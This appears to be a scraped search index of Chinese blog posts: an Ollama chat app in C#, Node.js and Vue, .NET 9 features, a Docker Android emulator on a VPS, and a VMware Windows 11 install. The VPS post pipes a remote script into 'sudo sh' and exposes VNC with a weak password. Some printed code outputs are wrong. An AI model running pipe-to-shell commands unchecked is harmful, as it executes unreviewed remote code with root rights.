JsonDocument.Parse(jsonResponse); return doc.RootElement.GetProperty(\u0026#34;response\u0026#34;).GetString(); } } 获取模型列表 (GetModelList):\n发送 GET 请求到 http://1.1.1.1:11434/api/tags 获取模型列表。 解析 JSON 响应，提取模型名称。 进行对话 (ChatWithOllama):\n发送 POST 请求到 http://1.1.1.1:11434/api/generate。 请求体包含： model: 选择的模型名称。 prompt: 用户输入的问题。 stream: false: 禁用流式响应，直接返回完整的结果。 交互方式:\n先获取模型列表，默认选择第一个模型。 进入对话循环，用户输入文本后，程序调用 API 获取 AI 回复并打印。\n运行示例： 获取可用模型列表\u0026hellip; 模型列表: llama3, gemma, mistral 使用模型: llama3 好！ Ollama: 好！很高兴见到。 是谁？ Ollama: 我是一个 AI 语言模型，可以帮助回答问题。 nodejs vue3 Node.js（Express + Vue 3）实现的对话网页，支持选择模型并与 Ollama 进行对话。\n后端（Node.js + Express）：提供 API 获取模型列表，并与 Ollama 进行对话。 前端（Vue 3 + Element Plus）：创建界面，允许用户选择模型并进行对话。\n后端（Node.js + Express） 安装依赖：\nnpm init -y npm install express axios cors 创建 server.js：\nconst express = require(\u0026#34;express\u0026#34;); const axios = require(\u0026#34;axios\u0026#34;); const cors = require(\u0026#34;cors\u0026#34;); const app = express(); const PORT = 3000; const OLLAMA_URL = \u0026#34;http://1.1.1.1:11434\u0026#34;; app.use(express.json()); app.use(cors()); // 获取可用模型列表 app.get(\u0026#34;/api/models\u0026#34;, async (req, res) =\u0026gt; { try { const response = await axios.get(`${OLLAMA_URL}/api/tags`); res.json(response.data.models); } catch (error) { res.status(500).json({ error: \u0026#34;获取模型列表失败\u0026#34; }); } }); // 发送对话请求 app.post(\u0026#34;/api/chat\u0026#34;, async (req, res) =\u0026gt; { const { model, message } = req.body; if (!model || !message) { return res.status(400).json({ error: \u0026#34;缺少模型或消息参数\u0026#34; }); } try { const response = await axios.post(`${OLLAMA_URL}/api/generate`, { model, prompt: message }); res.json(response.data); } catch (error) { res.status(500).json({ error: \u0026#34;对话请求失败\u0026#34; }); } }); app.listen(PORT, () =\u0026gt; { console.log(`Server running at http://localhost:${PORT}`); }); 前端（Vue 3 + Element Plus） 安装 Vue 3 项目：\nnpm create vue@latest ollama-chat cd ollama-chat npm install axios element-plus npm run dev 修改 src/App.vue：\n\u0026lt;script setup\u0026gt; import { ref, onMounted } from \u0026#34;vue\u0026#34;; import axios from \u0026#34;axios\u0026#34;; import { ElMessage } from \u0026#34;element-plus\u0026#34;; const models = ref([]); const selectedModel = ref(\u0026#34;\u0026#34;); const userInput = ref(\u0026#34;\u0026#34;); const chatHistory = ref([]); const fetchModels = async () =\u0026gt; { try { const response = await axios.get(\u0026#34;http://localhost:3000/api/models\u0026#34;); models.value = response.data; if (models.value.length \u0026gt; 0) { selectedModel.value = models.value[0].name; // 默认选第一个 } } catch (error) { ElMessage.error(\u0026#34;无法获取模型列表\u0026#34;); } }; const sendMessage = async () =\u0026gt; { if (!userInput.value.trim()) { ElMessage.warning(\u0026#34;请输入内容\u0026#34;); return; } if (!selectedModel.value) { ElMessage.warning(\u0026#34;请选择模型\u0026#34;); return; } const userMessage = { role: \u0026#34;user\u0026#34;, content: userInput.value }; chatHistory.value.push(userMessage); try { const response = await axios.post(\u0026#34;http://localhost:3000/api/chat\u0026#34;, { model: selectedModel.value, message: userInput.value, }); chatHistory.value.push({ role: \u0026#34;assistant\u0026#34;, content: response.data.response }); } catch (error) { ElMessage.error(\u0026#34;请求失败\u0026#34;); } userInput.value = \u0026#34;\u0026#34;; }; onMounted(fetchModels); \u0026lt;/script\u0026gt; \u0026lt;template\u0026gt; \u0026lt;div style=\u0026#34;max-width: 600px; margin: auto; padding: 20px\u0026#34;\u0026gt; \u0026lt;el-select v-model=\u0026#34;selectedModel\u0026#34; placeholder=\u0026#34;选择模型\u0026#34; style=\u0026#34;width: 100%; margin-bottom: 10px\u0026#34;\u0026gt; \u0026lt;el-option v-for=\u0026#34;model in models\u0026#34; :key=\u0026#34;model.name\u0026#34; :label=\u0026#34;model.name\u0026#34; :value=\u0026#34;model.name\u0026#34; /\u0026gt; \u0026lt;/el-select\u0026gt; \u0026lt;div v-for=\u0026#34;(msg, index) in chatHistory\u0026#34; :key=\u0026#34;index\u0026#34; :style=\u0026#34;{ textAlign: msg.role === \u0026#39;user\u0026#39; ? \u0026#39;right\u0026#39; : \u0026#39;left\u0026#39; }\u0026#34;\u0026gt; \u0026lt;el-card shadow=\u0026#34;never\u0026#34; style=\u0026#34;margin: 5px 0\u0026#34;\u0026gt; \u0026lt;strong\u0026gt;{{ msg.role === \u0026#34;user\u0026#34; ? \u0026#34;：\u0026#34; : \u0026#34;Ollama：\u0026#34; }}\u0026lt;/strong\u0026gt; {{ msg.content }} \u0026lt;/el-card\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;el-input v-model=\u0026#34;userInput\u0026#34; placeholder=\u0026#34;输入消息...\u0026#34; @keyup.enter=\u0026#34;sendMessage\u0026#34; /\u0026gt; \u0026lt;el-button type=\u0026#34;primary\u0026#34; @click=\u0026#34;sendMessage\u0026#34; style=\u0026#34;width: 100%; margin-top: 10px\u0026#34;\u0026gt;发送\u0026lt;/el-button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;style\u0026gt; .el-card { padding: 10px; border-radius: 8px; } \u0026lt;/style\u0026gt; 运行项目 运行后端： node server.js 运行前端： npm run dev\n打开浏览器访问 Vue 开发服务器（一般是 http://localhost:5173）。 功能说明 ✅ 模型选择：前端请求 http://1.1.1.1:11434/api/tags 获取可用的 Ollama 模型列表。 ✅ 对话功能：输入消息后，前端发送到后端，后端请求 Ollama 进行生成，并返回回复。 ✅ 历史记录：显示用户和 AI 的对话内容。 ✅ 简单 UI：使用 Vue 3 和 Element Plus 构建界面，支持快捷键 Enter 发送消息。\n这个示例可以直接用于和 Ollama 交互，并支持不同的 LLM 模型选择 🚀\n解析 Ollama 流式响应，显示对话内容。 前端调整\n\u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;Ollama Chat\u0026lt;/h1\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;model-select\u0026#34;\u0026gt;选择模型:\u0026lt;/label\u0026gt; \u0026lt;select id=\u0026#34;model-select\u0026#34; v-model=\u0026#34;selectedModel\u0026#34;\u0026gt; \u0026lt;option v-for=\u0026#34;model in models\u0026#34; :key=\u0026#34;model.name\u0026#34; :value=\u0026#34;model.name\u0026#34;\u0026gt; {{ model.name }} \u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;textarea v-model=\u0026#34;userInput\u0026#34; placeholder=\u0026#34;输入的消息...\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;button @click=\u0026#34;sendMessage\u0026#34;\u0026gt;发送\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;对话内容:\u0026lt;/h2\u0026gt; \u0026lt;pre\u0026gt;{{ conversation }}\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import axios from \u0026#39;axios\u0026#39;; export default { data() { return { models: [], // 模型列表 selectedModel: \u0026#39;\u0026#39;, // 当前选中的模型 userInput: \u0026#39;\u0026#39;, // 用户输入的消息 conversation: \u0026#39;\u0026#39;, // 对话内容 }; }, async created() { // 页面加载时获取模型列表 await this.fetchModels(); }, methods: { // 获取模型列表 async fetchModels() { try { const response = await axios.get(\u0026#39;https://eog9l2jl-cig0n4bq-ferbg20o9l88.vcc4.mcprev.cn/api/models\u0026#39;); this.models = response.data; if (this.models.length \u0026gt; 0) { this.selectedModel = this.models[0].name; // 默认选择第一个模型 } } catch (error) { console.error(\u0026#39;获取模型列表失败:\u0026#39;, error); } }, // 发送消息 async sendMessage() { if (!this.userInput.trim()) return; // 如果输入为空，直接返回 const message = this.userInput; this.conversation += `用户: ${message}\\n`; // 将用户输入添加到对话内容 this.userInput = \u0026#39;\u0026#39;; // 清空输入框 try { const response = await axios.post(\u0026#39;https://eog9l2jl-cig0n4bq-ferbg20o9l88.vcc4.mcprev.cn/api/chat\u0026#39;, { model: this.selectedModel, message: message, }); // 解析流式返回的数据 const rawData = response.data.split(\u0026#39;\\n\u0026#39;); // 按行拆分 JSON let aiResponse = \u0026#39;\u0026#39;; rawData.forEach(line =\u0026gt; { if (line.trim()) { try { const parsed = JSON.parse(line); if (parsed.response) { aiResponse += parsed.response; // 拼接 AI 回复 } } catch (error) { console.error(\u0026#39;JSON 解析失败:\u0026#39;, error); } } }); // 更新对话内容 this.conversation += `AI: ${aiResponse}\\n`; } catch (error) { console.error(\u0026#39;发送消息失败:\u0026#39;, error); this.conversation += `AI: 请求失败，请稍后重试。\\n`; } }, }, }; \u0026lt;/script\u0026gt; \u0026lt;style\u0026gt; /* 可以在这里添加一些样式 */ textarea { width: 300px; height: 100px; margin-bottom: 10px; } button { padding: 5px 10px; cursor: pointer; } pre { white-space: pre-wrap; /* 保留换行符 */ background: #f4f4f4; padding: 10px; border-radius: 5px; } \u0026lt;/style\u0026gt; 可滚动框 我们可以使用 CSS 的 overflow 属性。\n\u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;对话内容:\u0026lt;/h2\u0026gt; \u0026lt;div style=\u0026quot;max-height: 200px; overflow-y: auto;\u0026quot;\u0026gt; \u0026lt;pre\u0026gt;{{ conversation }}\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; 我们添加了一个新的 元素，并设置了它的 style 属性。max-height: 200px 限制了这个框的最大高度，而 overflow-y: auto 则允许在内容超出这个高度时出现滚动条。\n智商测试 strawberry有多少个r？ 10.11和10.2谁大？ 24点游戏解题:3 4 7 13 树上10只鸟，开枪打死1只，请问还有多少只鸟？\n","permalink":"https://qfsyso.github.io/posts/deepseek-local-deploy/","summary":"DeepSeek DeepSeek是杭州深度求索人工智能技术有限公司推出的人工智能项目，涵盖公司品牌、人工智能模型及相关 AI 工具等多层含义，以下是具体介绍： 公司层面DeepSeek 是一家 2023 年 5 月成立的中国人工智能公司，由对冲基金公司 High-Flyer 出资成立。其创始人梁文峰带领团队专注于人工智能基础技术研究与开发，在人工智能领域尤其是大语言模型方向投入了大量研究资源并取得成果。 模型层面 DeepSeek Coder：2023 年 11 月 2 日发布，是完全开源且可免费用于商业用途的模型，为开发者提供了基础的代码生成等能力支持。 DeepSeek LLM：2023 年 11 月 29 日推出，具有 670 亿参数，性能与当时的 GPT-4 接近，同时推出了聊天版本 DeepSeek Chat。 DeepSeek V2：2024 年 5 月发布，以性价比高而闻名，每百万输出 tokens 仅需 2 元人民币，在 LLM 排名中位列第七。 DeepSeek R1-lite-preview：2024 年 11 月发布，擅长逻辑推理、数学推理和实时问题解决，在一些基准测试中声称超越了 OpenAI O1，但也有测试显示存在速度等方面的挑战。 DeepSeek V3：2024 年 12 月发布，拥有 6710 亿参数，训练仅花费 558 万美元，约 55 天时间，在基准测试中性能优于 Llama 3.1 和 Qwen 2.5，与 GPT-4 O 和 Claude 3.","title":"deepseek local deploy"},{"content":".NET9 迄今为止最高效、最现代、最安全、最智能、性能最高的.NET版本\ndotnet --list-sdks # 指令查看是否以安装.NET9。 下载.NET9 SDK安装 or\nIDE Visual Studio 更新\nLock 引入 System.Threading.Lock 是 .NET 提供的一个更优雅的锁定机制，可以替代传统的基于 Monitor 的锁定方式。以下是新锁定机制的特点及示例代码：\nusing System; using System.Threading; class Program { private static readonly Lock _lock = new(); static void Main() { // 使用新锁定机制 using (_lock.EnterScope()) { Console.WriteLine(\u0026#34;这是线程安全的代码块\u0026#34;); // 在这里执行线程安全的操作 } // 演示多线程场景 Thread thread1 = new(() =\u0026gt; AccessResource(\u0026#34;线程1\u0026#34;)); Thread thread2 = new(() =\u0026gt; AccessResource(\u0026#34;线程2\u0026#34;)); thread1.Start(); thread2.Start(); thread1.Join(); thread2.Join(); } static void AccessResource(string threadName) { using (_lock.EnterScope()) { Console.WriteLine($\u0026#34;{threadName} 正在访问共享资源...\u0026#34;); Thread.Sleep(1000); // 模拟一些操作 Console.WriteLine($\u0026#34;{threadName} 完成访问\u0026#34;); } } } 定义锁对象：\nprivate static readonly Lock _lock = new(); Lock 类型专门用于实现锁定，比 object 更清晰和安全。 进入锁定范围： using (_lock.EnterScope()) EnterScope 返回一个 ref struct，它在离开作用域时自动释放锁。 多线程场景： 多个线程尝试访问共享资源，通过 using 确保代码块是线程安全的。 优势 避免传统 Monitor.Enter 和 Monitor.Exit 的繁琐代码及潜在的错误。 自动释放锁，减少资源泄漏的风险。 类型安全的设计避免了在异步场景中的误用。 注意事项 Lock.EnterScope 返回 ref struct，因此它不能被捕获或在异步方法中使用。 Lock 是不可复制的，确保锁的独占性和安全性。 这是一个更现代化的线程同步方式，非常适合在新项目中使用。\n更安全、更高效。 可以和using一起使用\n.NET Aspire - Blazor Web Web API 可以选择使用 Redis 进行缓存 测试项目\nhttps://learn.microsoft.com/zh-cn/dotnet/aspire/\nhttps://github.com/communitytoolkit/aspire https://learn.microsoft.com/zh-cn/dotnet/aspire/whats-new/dotnet-aspire-9?tabs=windows\n对比.NET8 ,.NET9 多了 vue recat angular web项目\nUUID v7 我们经常在实体中使用Guid作为主键，并且通过Guid.NewGuid()可以很方便的生成一个新的Guid，而此方法生成的Guid是依据UUID第四个版本规范生成的。\n当前已经可以通过Guid.CreateVersion7()方法创建UUID第七个版本，这个版本UUID主要功能就是包含了时间戳，数据结构如下：\n| 48位时间戳 | 12位随机 | 62位随机 |\n这也意味着v7版本的UUID可以按时间排序了，在数据库中使用起来更方便，同时Guid.CreateVersion7()方法还有一个重载方法接收DateTimeOffset类型时间戳，用来通过指定时间创建UUID。\n// v4 UUID var guid_v4 = Guid.NewGuid(); // v7 UUID var guid_v7 = Guid.CreateVersion7(); // v7 UUID with timestamp var guid_v7_time = Guid.CreateVersion7(TimeProvider.System.GetLocalNow()); Console.WriteLine(guid_v4); Console.WriteLine(guid_v7); Console.WriteLine(guid_v7_time); \\e 在 C# 中，随着新的转义序列 \\e 的引入，开发者可以更方便地表示 Unicode 字符 U+001B (ESCAPE 字符)。以下是一些代码示例，展示如何使用新的转义序列 \\e 和传统方式的区别。\nusing System; class Program { static void Main() { // 使用新的转义序列 \\e string newEscapeSequence = \u0026#34;\\e[31mHello, World!\\e[0m\u0026#34;; // ANSI 转义代码：红色文本 Console.WriteLine(\u0026#34;Using \\\\e:\u0026#34;); Console.WriteLine(newEscapeSequence); // 使用旧的方式 \\u001b string oldUnicodeEscape = \u0026#34;\\u001b[31mHello, World!\\u001b[0m\u0026#34;; // ANSI 转义代码：红色文本 Console.WriteLine(\u0026#34;Using \\\\u001b:\u0026#34;); Console.WriteLine(oldUnicodeEscape); // 使用旧的方式 \\x1b string oldHexEscape = \u0026#34;\\x1b[31mHello, World!\\x1b[0m\u0026#34;; // ANSI 转义代码：红色文本 Console.WriteLine(\u0026#34;Using \\\\x1b:\u0026#34;); Console.WriteLine(oldHexEscape); // 注意：\\x1b 后可能意外包含后续的有效十六进制字符 string potentialIssue = \u0026#34;\\x1b7Hello\u0026#34;; // 可能被解析为 \\x1b7 而不是单独的 \\x1b Console.WriteLine(\u0026#34;Potential issue with \\\\x1b:\u0026#34;); Console.WriteLine(potentialIssue); } } 推荐使用 \\e：它更简洁并且没有可能的歧义。 避免使用 \\x1b：如果后续字符是十六进制数字，可能导致意外结果。例如，\\x1b7 会被解析为一个字符，而不是 ESC 字符后跟 7。 向后兼容：C# 仍然支持 \\u001b 和 \\x1b，但建议逐步迁移到 \\e。 新的转义序列 \\e 提高了代码可读性和安全性，特别是在处理 ANSI 转义序列时。\n以下是一些更丰富的示例，展示如何使用新的 \\e 转义序列，以及如何在各种场景中替代旧的方式。\n示例 1: 控制台中的颜色切换 using System; class Program { static void Main() { // 使用 \\e 转义序列来改变文字颜色 string redText = \u0026#34;\\e[31mThis is red text\\e[0m\u0026#34;; // 红色文本 string greenText = \u0026#34;\\e[32mThis is green text\\e[0m\u0026#34;; // 绿色文本 string yellowText = \u0026#34;\\e[33mThis is yellow text\\e[0m\u0026#34;; // 黄色文本 Console.WriteLine(redText); Console.WriteLine(greenText); Console.WriteLine(yellowText); } } 示例 2: 带有光标移动的控制台输出 using System; class Program { static void Main() { // 使用 \\e 来控制光标位置 string moveCursorUp = \u0026#34;\\e[1A\u0026#34;; // 光标上移 1 行 string moveCursorDown = \u0026#34;\\e[1B\u0026#34;; // 光标下移 1 行 string moveCursorRight = \u0026#34;\\e[10C\u0026#34;; // 光标右移 10 列 Console.WriteLine(\u0026#34;Line 1\u0026#34;); Console.WriteLine(\u0026#34;Line 2\u0026#34;); Console.WriteLine(moveCursorUp + \u0026#34;Moved Up\u0026#34;); Console.WriteLine(moveCursorRight + \u0026#34;Moved Right\u0026#34;); } } 示例 3: 格式化多种样式 using System; class Program { static void Main() { // 使用 ANSI 转义序列来混合样式 string boldAndRed = \u0026#34;\\e[1;31mBold and Red Text\\e[0m\u0026#34;; // 粗体 + 红色 string underlineAndGreen = \u0026#34;\\e[4;32mUnderline and Green Text\\e[0m\u0026#34;; // 下划线 + 绿色 string inverted = \u0026#34;\\e[7mInverted Colors\\e[0m\u0026#34;; // 反转颜色 Console.WriteLine(boldAndRed); Console.WriteLine(underlineAndGreen); Console.WriteLine(inverted); } } 示例 4: 清屏和隐藏光标 using System; class Program { static void Main() { // 使用 \\e 控制控制台清屏和隐藏光标 string clearScreen = \u0026#34;\\e[2J\u0026#34;; // 清屏 string hideCursor = \u0026#34;\\e[?25l\u0026#34;; // 隐藏光标 string showCursor = \u0026#34;\\e[?25h\u0026#34;; // 显示光标 Console.WriteLine(\u0026#34;This will be cleared...\u0026#34;); Console.WriteLine(clearScreen + \u0026#34;Screen Cleared!\u0026#34;); Console.WriteLine(hideCursor + \u0026#34;Cursor Hidden!\u0026#34;); Console.WriteLine(\u0026#34;Press Enter to show cursor again...\u0026#34;); Console.ReadLine(); Console.WriteLine(showCursor + \u0026#34;Cursor Visible!\u0026#34;); } } 示例 5: 动态加载进度条 using System; using System.Threading; class Program { static void Main() { string progressBarTemplate = \u0026#34;\\e[32m[####################]\\e[0m\u0026#34;; string clearLine = \u0026#34;\\e[2K\\r\u0026#34;; for (int i = 0; i \u0026lt;= 20; i++) { string progress = new string(\u0026#39;#\u0026#39;, i) + new string(\u0026#39; \u0026#39;, 20 - i); Console.Write(clearLine + $\u0026#34;\\e[32m[{progress}]\\e[0m {i * 5}%\u0026#34;); Thread.Sleep(200); // 模拟任务处理时间 } Console.WriteLine(\u0026#34;\\nDone!\u0026#34;); } } 示例总结 颜色：用 \\e 定义颜色文本非常方便。 光标控制：\\e 可用来实现光标的移动、隐藏和显示。 混合样式：支持多种样式组合，比如粗体、下划线和颜色。 屏幕操作：清屏、隐藏光标等功能大幅提高了终端交互的灵活性。 动态效果：用 \\e 创建进度条、动态输出等非常直观。\n索引运算符 隐式“从末尾开始”索引运算符 ^，需要按照以下步骤操作。以下是完整的用法指南：\n前置条件 环境要求： C# 8.0 或更高版本。 .NET Core 3.0 或更高版本，或 .NET Framework 支持的版本。 buffer 属性要求： buffer 必须是支持索引器的类型，例如数组 (T[])、列表 (List) 或其他实现了 IList 的集合类型。\n代码示例 1. 使用数组 using System; class S { public int[] buffer = new int[10]; // 定义一个大小为10的数组 } class Program { static void Main() { var v = new S() { buffer = { [^1] = 0, // 倒数第1个元素设置为 0 [^2] = 1, // 倒数第2个元素设置为 1 [^3] = 2, // 倒数第3个元素设置为 2 [^4] = 3, // 倒数第4个元素设置为 3 [^5] = 4 // 倒数第5个元素设置为 4 } }; // 输出结果 Console.WriteLine(string.Join(\u0026#34;, \u0026#34;, v.buffer)); // 输出: 0, 0, 0, 0, 4, 3, 2, 1, 0, 0 } } 2. 使用 List 如果 buffer 是一个 List，可以这样初始化：\nusing System; using System.Collections.Generic; class S { public List\u0026lt;int\u0026gt; buffer = new List\u0026lt;int\u0026gt;(new int[10]); // 初始化为10个元素 } class Program { static void Main() { var v = new S() { buffer = { [^1] = 0, [^2] = 1, [^3] = 2, [^4] = 3, [^5] = 4 } }; // 输出结果 Console.WriteLine(string.Join(\u0026#34;, \u0026#34;, v.buffer)); // 输出: 0, 0, 0, 0, 4, 3, 2, 1, 0, 0 } } JSON JsonSerializerOptions 缩进选项 ，可支持自定义写入 JSON 的缩进字符和缩进大小。\nvar options = new JsonSerializerOptions { WriteIndented = true, IndentCharacter = \u0026#39;\\t\u0026#39;, IndentSize = 2, }; string json = JsonSerializer.Serialize( new { Value = 1 }, options ); Console.WriteLine(json); var data = new { Name = \u0026#34;Alice\u0026#34;, Age = 30, Skills = new[] { \u0026#34;C#\u0026#34;, \u0026#34;ASP.NET Core\u0026#34;, \u0026#34;Blazor\u0026#34; } }; // 默认缩进格式 var defaultOptions = new JsonSerializerOptions { WriteIndented = true }; Console.WriteLine(\u0026#34;默认格式:\u0026#34;); Console.WriteLine(JsonSerializer.Serialize(data, defaultOptions)); // 使用自定义缩进字符（制表符）和大小 var customOptions = new JsonSerializerOptions { WriteIndented = true, IndentCharacter = \u0026#39;\\t\u0026#39;, // 使用制表符 IndentSize = 1 // 每层缩进 1 个制表符 }; Console.WriteLine(\u0026#34;\\n自定义制表符缩进:\u0026#34;); Console.WriteLine(JsonSerializer.Serialize(data, customOptions)); // 使用自定义空格缩进 var customSpaceOptions = new JsonSerializerOptions { WriteIndented = true, IndentCharacter = \u0026#39; \u0026#39;, // 使用空格 IndentSize = 4 // 每层缩进 4 个空格 }; Console.WriteLine(\u0026#34;\\n自定义空格缩进:\u0026#34;); Console.WriteLine(JsonSerializer.Serialize(data, customSpaceOptions)); 结果 { \u0026ldquo;Value\u0026rdquo;: 1 } 默认格式: { \u0026ldquo;Name\u0026rdquo;: \u0026ldquo;Alice\u0026rdquo;, \u0026ldquo;Age\u0026rdquo;: 30, \u0026ldquo;Skills\u0026rdquo;: [ \u0026ldquo;C#\u0026rdquo;, \u0026ldquo;ASP.NET Core\u0026rdquo;, \u0026ldquo;Blazor\u0026rdquo; ] }\n自定义制表符缩进: { \u0026ldquo;Name\u0026rdquo;: \u0026ldquo;Alice\u0026rdquo;, \u0026ldquo;Age\u0026rdquo;: 30, \u0026ldquo;Skills\u0026rdquo;: [ \u0026ldquo;C#\u0026rdquo;, \u0026ldquo;ASP.NET Core\u0026rdquo;, \u0026ldquo;Blazor\u0026rdquo; ] }\n自定义空格缩进: { \u0026ldquo;Name\u0026rdquo;: \u0026ldquo;Alice\u0026rdquo;, \u0026ldquo;Age\u0026rdquo;: 30, \u0026ldquo;Skills\u0026rdquo;: [ \u0026ldquo;C#\u0026rdquo;, \u0026ldquo;ASP.NET Core\u0026rdquo;, \u0026ldquo;Blazor\u0026rdquo; ] }\nJsonSerializerOptions 新增了对自定义 JSON 缩进字符和缩进大小的支持。这项特性主要通过两个新属性实现：\nIndentChars: 指定用于缩进的字符（默认为空格 \u0026quot; \u0026ldquo;）。 IndentSize: 指定缩进的大小（默认为 2）。 这些属性让开发者灵活控制 JSON 格式，适配不同需求：\n日志优化: 提高可读性，便于结构定位。 前端适配: 符合框架缩进要求。 空间节约: 减少 JSON 体积。 工具兼容: 满足外部格式要求。\nJsonSerializerOptions.Web 是一个新的单例实例，专为 Web 应用程序设计，提供了默认的 JSON 序列化选项。它的主要特点包括：\n属性命名策略：将属性名称从 PascalCase 转换为 camelCase，以符合 JavaScript 的命名惯例。\n忽略默认值：在序列化过程中，忽略属性的默认值（如 null、0、false），以减少传输的数据量。\n数字处理：允许从字符串读取数字，以提高灵活性。\n这些默认设置使得在 Web 环境中进行 JSON 序列化时，无需手动配置即可获得符合 Web 标准的输出。\npublic class Product { public int Id { get; set; } public string Name { get; set; } = \u0026#34;P1-DWD1\u0026#34;; public decimal Price { get; set; } = 0.0m; // 默认值 public string? Description { get; set; } = null; // 可空类型 } public class Program { static void Main(string[] args) { var product = new Product(); // 使用 JsonSerializerOptions.Web 进行序列化 string json = JsonSerializer.Serialize(product, JsonSerializerOptions.Web); Console.WriteLine(json); } } {\u0026ldquo;id\u0026rdquo;:0,\u0026ldquo;name\u0026rdquo;:\u0026ldquo;P1-DWD1\u0026rdquo;,\u0026ldquo;price\u0026rdquo;:0.0,\u0026ldquo;description\u0026rdquo;:null}\nDebian .NET9 wget https://download.visualstudio.microsoft.com/download/pr/xxx/dotnet-sdk-9.0.0.deb sudo dpkg -i dotnet-sdk-9.0.0.deb sudo apt-get install -f # 如果有依赖问题 dotnet --version ","permalink":"https://qfsyso.github.io/posts/.net9-lock-aspire-uuid-jsonserializeroptions/","summary":".NET9 迄今为止最高效、最现代、最安全、最智能、性能最高的.NET版本\ndotnet --list-sdks # 指令查看是否以安装.NET9。 下载.NET9 SDK安装 or\nIDE Visual Studio 更新\nLock 引入 System.Threading.Lock 是 .NET 提供的一个更优雅的锁定机制，可以替代传统的基于 Monitor 的锁定方式。以下是新锁定机制的特点及示例代码：\nusing System; using System.Threading; class Program { private static readonly Lock _lock = new(); static void Main() { // 使用新锁定机制 using (_lock.EnterScope()) { Console.WriteLine(\u0026#34;这是线程安全的代码块\u0026#34;); // 在这里执行线程安全的操作 } // 演示多线程场景 Thread thread1 = new(() =\u0026gt; AccessResource(\u0026#34;线程1\u0026#34;)); Thread thread2 = new(() =\u0026gt; AccessResource(\u0026#34;线程2\u0026#34;)); thread1.Start(); thread2.Start(); thread1.Join(); thread2.Join(); } static void AccessResource(string threadName) { using (_lock.","title":".NET9 lock Aspire UUID JsonSerializerOptions "},{"content":"vps cloud mobile VPS云服务器搭建云手机教程\n首先检查自己vps是否支持这个项目 sudo apt install cpu-checker kvm-ok INFO: /dev/kvm exists KVM acceleration can be used 表示支持，可以继续往下看 ac13\n安装docker curl -fsSL https://get.docker.com | sudo sh 然后就是直接引用大佬的项目了（感谢budtmo大佬的分享）\ndocker run -d -p 29898:6080 -e EMULATOR_DEVICE=\u0026#34;Samsung Galaxy S10\u0026#34; -e WEB_VNC=true -e VNC_PASSWORD=nodeseek --device /dev/kvm --name android-container budtmo/docker-android:emulator_11.0 其中，上面的代码29898可以改成自己想要的端口 nodeseek改成自己想要的密码 budtmo/docker-android:emulator_11.0，可以选择安卓9.0到13.0（根据自己的vps配置，直接改最后面的数字） Samsung Galaxy S10可以根据自己的配置选择自己想要的机型，设备名单具体见下表\n种类 设备名称\nPhone Samsung Galaxy S10 Phone Samsung Galaxy S9 Phone Samsung Galaxy S8 Phone Samsung Galaxy S7 Edge Phone Samsung Galaxy S7 Phone Samsung Galaxy S6 Phone Nexus 4 Phone Nexus 5 Phone Nexus One Phone Nexus S Tablet Nexus 7 运行完成后，打开浏览器，地址栏输入IP：端口 即可访问了！\n","permalink":"https://qfsyso.github.io/posts/vps-cloud-mobile/","summary":"vps cloud mobile VPS云服务器搭建云手机教程\n首先检查自己vps是否支持这个项目 sudo apt install cpu-checker kvm-ok INFO: /dev/kvm exists KVM acceleration can be used 表示支持，可以继续往下看 ac13\n安装docker curl -fsSL https://get.docker.com | sudo sh 然后就是直接引用大佬的项目了（感谢budtmo大佬的分享）\ndocker run -d -p 29898:6080 -e EMULATOR_DEVICE=\u0026#34;Samsung Galaxy S10\u0026#34; -e WEB_VNC=true -e VNC_PASSWORD=nodeseek --device /dev/kvm --name android-container budtmo/docker-android:emulator_11.0 其中，上面的代码29898可以改成自己想要的端口 nodeseek改成自己想要的密码 budtmo/docker-android:emulator_11.0，可以选择安卓9.0到13.0（根据自己的vps配置，直接改最后面的数字） Samsung Galaxy S10可以根据自己的配置选择自己想要的机型，设备名单具体见下表\n种类 设备名称\nPhone Samsung Galaxy S10 Phone Samsung Galaxy S9 Phone Samsung Galaxy S8 Phone Samsung Galaxy S7 Edge Phone Samsung Galaxy S7 Phone Samsung Galaxy S6 Phone Nexus 4 Phone Nexus 5 Phone Nexus One Phone Nexus S Tablet Nexus 7 运行完成后，打开浏览器，地址栏输入IP：端口 即可访问了！","title":" vps cloud mobile"},{"content":"VMware安装win11 新建虚拟机 稍后安装系统\n右键 电源 进入固件 出现 无法连接虚拟设备 sata0：1，因为主机上没用相应设备 设备-启动时连接 取消打钩\n右键 可移动设备 - U盘连接\n进入PE 打开DG 右键转为GUID 保存更改\n顶部空闲右键 创建ESP分区 空间建立新分区 系统分区 D Save ESP右键 指定新的驱动器-盘符 F\n建立分区 保存格式化\n一键装机 !注意目标分区D/引导分区F\n安装完重启后\n右键 可移动设备 - U盘断开 引导安装\nEND\n","permalink":"https://qfsyso.github.io/posts/vmware-install-win11/","summary":"VMware安装win11 新建虚拟机 稍后安装系统\n右键 电源 进入固件 出现 无法连接虚拟设备 sata0：1，因为主机上没用相应设备 设备-启动时连接 取消打钩\n右键 可移动设备 - U盘连接\n进入PE 打开DG 右键转为GUID 保存更改\n顶部空闲右键 创建ESP分区 空间建立新分区 系统分区 D Save ESP右键 指定新的驱动器-盘符 F\n建立分区 保存格式化\n一键装机 !注意目标分区D/引导分区F\n安装完重启后\n右键 可移动设备 - U盘断开 引导安装\nEND","title":"vmware install win11"},{"content":"更换 iRedMail 的域名 （如从 mail.example.com 更换为 mail.mydomain.com）， 需要修改多个配置文件和数据库记录，并确保新的域名配置正确。 以下是操作步骤：\n步骤 1：更新 DNS 记录 在域名托管平台更新 mail.mydomain.com 的 DNS 记录： A记录：指向邮件服务器的 IP 地址。 MX记录：指向 mail.mydomain.com。 SPF 记录：确保包括新的域名。 DKIM 和 DMARC 记录：重新生成并更新。 确保 DNS 更改后可以通过 dig 或 nslookup 